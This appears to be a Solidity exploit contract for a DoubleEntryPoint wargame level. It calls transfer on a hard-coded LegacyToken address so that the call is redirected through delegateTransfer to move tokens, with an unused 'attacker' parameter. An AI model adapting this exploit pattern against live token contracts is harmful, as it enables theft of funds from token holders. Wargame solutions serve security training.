pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
}

interface DelegateERC20 {
    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

contract AttackDoubleEntryPoint2 {
    address constant LEGACY_TOKEN = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;

    function attack(address victim, address attacker) public {
        // LegacyToken will redirect transfer to delegateTransfer in DoubleEntryPoint
        IERC20(LEGACY_TOKEN).transfer(victim, 1000000000000000000000);
    }
}